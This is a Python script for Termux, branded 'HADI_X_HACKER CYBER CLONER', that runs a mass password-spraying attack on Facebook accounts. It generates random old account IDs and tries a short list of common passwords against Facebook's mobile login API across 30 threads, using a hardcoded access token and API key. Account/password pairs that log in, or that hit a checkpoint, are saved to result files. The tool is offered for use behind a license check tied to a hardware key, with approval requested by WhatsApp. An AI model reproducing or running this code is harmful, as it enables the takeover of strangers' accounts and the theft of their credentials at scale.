#!/usr/bin/env python3
# =========================================================
# TOOL NAME   : HADI_X_HACKER CYBER CLONER (AUTOMATED)
# CREATED BY  : HADI X HACKER
# OPTIMIZED   : TERMUX, FAST MULTI-THREADING & AUTO-RETRY
# SYSTEM      : REMOTE LICENSE MANAGEMENT (REVOKE/APPROVE)
# =========================================================

import os
import sys
import time
import uuid
import hashlib
import random
import platform
import subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Auto-installer for missing modules
def auto_install():
    try:
        import requests
    except ImportError:
        print("\033[38;5;51m[+] Installing required dependencies...\033[0m")
        os.system("pip install requests urllib3")
        import requests

auto_install()
import requests

# ---------------------------------------------------------
# CENTRAL CONFIGURATION & SOCIAL LINKS
# ---------------------------------------------------------
# APNA GITHUB RAW APPROVED.TXT LINK YAHA PASTE KAREIN:
APPROVAL_URL = "https://raw.githubusercontent.com/khanhadi0890-ai/Hadi-Keys/refs/heads/main/approved.txt"

# APNE SOCIAL MEDIA LINKS YAHA SET KAREIN:
TELEGRAM_LINK = "https://www.facebook.com/profile.php?id=61594024541262"
WHATSAPP_LINK = "https://wa.me/923000000000"
INSTAGRAM_LINK = "https://instagram.com/Hadi_X_Hacker"

# Cyberpunk Neon Styling
C_PINK   = '\033[38;5;198m'
C_CYAN   = '\033[38;5;51m'
C_GREEN  = '\033[38;5;46m'
C_YELLOW = '\033[38;5;226m'
C_RED    = '\033[38;5;196m'
C_WHITE  = '\033[1;37m'
C_PURPLE = '\033[38;5;129m'
RESET    = '\033[0m'
BOLD     = '\033[1m'

loop = 0
oks = []
cps = []

# ---------------------------------------------------------
# UI & BANNER ENGINE
# ---------------------------------------------------------
def clear():
    os.system('clear' if os.name != 'nt' else 'cls')

def banner():
    clear()
    print(f"{C_CYAN}═"*62 + RESET)
    print(f"{C_PINK}{BOLD}")
    print(r"  ██╗  ██╗ █████╗ ██████╗ ██╗    ██╗  ██╗   ██╗██╗  ██╗")
    print(r"  ██║  ██║██╔══██╗██╔══██╗██║    ╚██╗██╔╝   ██║  ██║")
    print(r"  ███████║███████║██║  ██║██║     ╚███╔╝    ███████║")
    print(r"  ██╔══██║██╔══██║██║  ██║██║     ██╔██╗    ██╔══██║")
    print(r"  ██║  ██║██║  ██║██████╔╝██║    ██╔╝ ██╗   ██║  ██║")
    print(r"  ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝    ╚═╝  ╚═╝   ╚═╝  ╚═╝")
    print(f"{RESET}")
    print(f"{C_YELLOW}{BOLD}          CYBERPUNK ADVANCED CLONER ENGINE v4.0{RESET}")
    print(f"{C_PURPLE}              CREATED BY: HADI X HACKER{RESET}")
    print(f"{C_CYAN}═"*62 + RESET)

def check_storage():
    try:
        if os.path.exists('/sdcard'):
            return '/sdcard'
    except Exception:
        pass
    os.makedirs('HADI_RESULTS', exist_ok=True)
    return 'HADI_RESULTS'

SAVE_DIR = check_storage()

# ---------------------------------------------------------
# HARDWARE-BOUND KEY GENERATOR
# ---------------------------------------------------------
def get_hardware_key():
    """Generates unique ID based on Android Build & Termux Instance"""
    try:
        device_data = f"{platform.node()}-{os.getlogin() if hasattr(os, 'getlogin') else 'termux'}-{platform.processor()}-{platform.machine()}"
    except Exception:
        device_data = f"{uuid.getnode()}-{platform.system()}"
    
    raw_hash = hashlib.sha256(device_data.encode('utf-8')).hexdigest().upper()
    return f"HXH-{raw_hash[:4]}-{raw_hash[4:8]}"

def copy_to_clipboard(text):
    """Auto copies key to phone clipboard in Termux"""
    try:
        subprocess.run(f'echo "{text}" | termux-clipboard-set', shell=True, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def open_url(url):
    """Universal URL Opener for Termux / Mobile Browser"""
    if 'termux' in os.environ.get('PREFIX', ''):
        os.system(f"termux-open-url {url}")
    else:
        import webbrowser
        webbrowser.open(url)

# ---------------------------------------------------------
# AUTOMATED LICENSE CHECKER & APPROVAL MENU
# ---------------------------------------------------------
def verify_license():
    banner()
    user_key = get_hardware_key()
    print(f"{C_CYAN}[★] {C_YELLOW}CONNECTING TO HADI_X_HACKER SERVER...{RESET}\n")
    
    try:
        # Fetching raw GitHub approved list with cache bypass
        response = requests.get(f"{APPROVAL_URL}?nocache={random.randint(1000,9999)}", timeout=10)
        approved_keys = [k.strip() for k in response.text.splitlines() if k.strip()]
    except Exception:
        approved_keys = []

    if user_key in approved_keys:
        print(f"{C_GREEN}[✔] LICENSE VALIDATED! ACCESS GRANTED.{RESET}")
        time.sleep(1.2)
        return True
    else:
        copied = copy_to_clipboard(user_key)
        print(f"{C_RED}[✘] YOUR LICENSE IS NOT APPROVED / REVOKED!{RESET}")
        print(f"{C_CYAN}═"*62 + RESET)
        print(f"{C_WHITE}YOUR UNIQUE KEY : {C_GREEN}{BOLD}{user_key}{RESET}")
        if copied:
            print(f"{C_YELLOW}(Key has been auto-copied to your clipboard!){RESET}")
        print(f"{C_CYAN}═"*62 + RESET)
        
        print(f"\n{C_PURPLE}[SELECT CONTACT METHOD FOR APPROVAL]{RESET}")
        print(f"{C_PINK}[1]{C_CYAN} Send Key via WhatsApp")
        print(f"{C_PINK}[2]{C_CYAN} Send Key via Telegram")
        print(f"{C_PINK}[3]{C_CYAN} Send Key via Instagram")
        print(f"{C_PINK}[0]{C_RED} Exit Engine{RESET}")
        
        opt = input(f"\n{C_YELLOW}CHOOSE OPTION -> {RESET}").strip()
        if opt == '1':
            open_url(f"{WHATSAPP_LINK}?text=Hello%20Hadi_X_Hacker,%20please%20approve%20my%20key:%20{user_key}")
        elif opt == '2':
            open_url(TELEGRAM_LINK)
        elif opt == '3':
            open_url(INSTAGRAM_LINK)
            
        sys.exit()

# ---------------------------------------------------------
# OPTIMIZED CLONING ENGINE
# ---------------------------------------------------------
def dynamic_ua():
    android_v = random.randint(10, 14)
    chrome_v = f"{random.randint(112, 130)}.0.{random.randint(4000, 6000)}.{random.randint(100, 200)}"
    devices = ["SM-G998B", "SM-A526B", "Pixel 7 Pro", "Redmi Note 12", "POCO X5 Pro", "CPH2415"]
    return f"Mozilla/5.0 (Linux; Android {android_v}; {random.choice(devices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_v} Mobile Safari/537.36"

def login_worker(uid, user_agents):
    global loop, oks, cps
    sys.stdout.write(f"\r{C_CYAN}[HADI-CLONE]{C_WHITE} [{loop}] {C_GREEN}OK:{len(oks)} {C_YELLOW}CP:{len(cps)}{RESET}")
    sys.stdout.flush()

    passwords = ['123456', '1234567', '12345678', '123456789', 'pakistan', '786786']
    session = requests.Session()

    for pw in passwords:
        try:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': random.choice(user_agents),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, timeout=8).json()
            
            if 'session_key' in res:
                print(f"\r{C_GREEN}[HADI-OK] {uid} | {pw}{RESET}")
                open(f"{SAVE_DIR}/HADI-OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r{C_YELLOW}[HADI-CP] {uid} | {pw}{RESET}")
                open(f"{SAVE_DIR}/HADI-CP.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid)
                break
        except Exception:
            continue
    loop += 1

# ---------------------------------------------------------
# MAIN CATEGORY & MENU MANAGEMENT
# ---------------------------------------------------------
def old_cloning_category():
    banner()
    print(f"{C_PINK}[1]{C_CYAN} OLD ALL SERIES (2009 - 2014)")
    print(f"{C_PINK}[2]{C_CYAN} 100003 / 100004 SPECIFIC SERIES")
    print(f"{C_PINK}[3]{C_CYAN} RARE 2009 SPECIAL SERIES")
    print(f"{C_PINK}[0]{C_CYAN} BACK TO MAIN MENU{RESET}")
    print(f"{C_CYAN}═"*62 + RESET)
    
    choice = input(f"{C_YELLOW}SELECT CATEGORY -> {RESET}").strip()
    user_ids = []

    if choice == '1':
        banner()
        limit = int(input(f"{C_CYAN}[+] ENTER TARGET COUNT (e.g., 5000): {RESET}"))
        for _ in range(limit):
            user_ids.append('10000' + str(random.randint(1000000000, 4999999999)))
    elif choice == '2':
        banner()
        limit = int(input(f"{C_CYAN}[+] ENTER TARGET COUNT (e.g., 5000): {RESET}"))
        for _ in range(limit):
            prefix = random.choice(['100003', '100004'])
            suffix = ''.join(random.choices('0123456789', k=9))
            user_ids.append(prefix + suffix)
    elif choice == '3':
        banner()
        limit = int(input(f"{C_CYAN}[+] ENTER TARGET COUNT (e.g., 5000): {RESET}"))
        for _ in range(limit):
            suffix = ''.join(random.choices('0123456789', k=8))
            user_ids.append('1000004' + suffix)
    elif choice == '0':
        main_menu()
        return
    else:
        old_cloning_category()
        return

    banner()
    uas = [dynamic_ua() for _ in range(30)]
    print(f"{C_GREEN}[+] TARGET COUNT  : {len(user_ids)}")
    print(f"{C_GREEN}[+] SPEED THREADS : 30 (OPTIMIZED FOR TERMUX)")
    print(f"{C_GREEN}[+] OUTPUT PATH   : {SAVE_DIR}/")
    print(f"{C_CYAN}═"*62 + RESET)

    with ThreadPool(max_workers=30) as pool:
        for uid in user_ids:
            pool.submit(login_worker, uid, uas)

    print(f"\n{C_CYAN}═"*62 + RESET)
    print(f"{C_GREEN}[✔] PROCESS FINISHED SUCCESSFULLY.")
    print(f"{C_GREEN}[✔] SAVED OK: {len(oks)} | SAVED CP: {len(cps)}{RESET}")
    input(f"\n{C_YELLOW}Press Enter to return...{RESET}")
    main_menu()

def main_menu():
    global loop, oks, cps
    loop = 0
    oks.clear()
    cps.clear()

    banner()
    print(f"{C_PINK}[1]{C_CYAN} START OLD CLONER")
    print(f"{C_PINK}[2]{C_CYAN} CHECK MY HARDWARE KEY")
    print(f"{C_PINK}[3]{C_CYAN} CONTACT AUTHOR (HADI X HACKER)")
    print(f"{C_PINK}[0]{C_CYAN} EXIT ENGINE{RESET}")
    print(f"{C_CYAN}═"*62 + RESET)

    ch = input(f"{C_YELLOW}CHOOSE OPTION -> {RESET}").strip()
    if ch == '1':
        old_cloning_category()
    elif ch == '2':
        banner()
        key = get_hardware_key()
        print(f"{C_CYAN}[★] YOUR HARDWARE KEY : {C_GREEN}{BOLD}{key}{RESET}")
        copy_to_clipboard(key)
        print(f"{C_YELLOW}(Auto-copied to clipboard!){RESET}")
        input(f"\n{C_YELLOW}Press Enter to return...{RESET}")
        main_menu()
    elif ch == '3':
        open_url(WHATSAPP_LINK)
        main_menu()
    elif ch == '0':
        print(f"{C_PINK}\nThanks for using Hadi X Hacker Cloner Engine!{RESET}")
        sys.exit()
    else:
        main_menu()

if __name__ == '__main__':
    verify_license()
    main_menu()
                                           
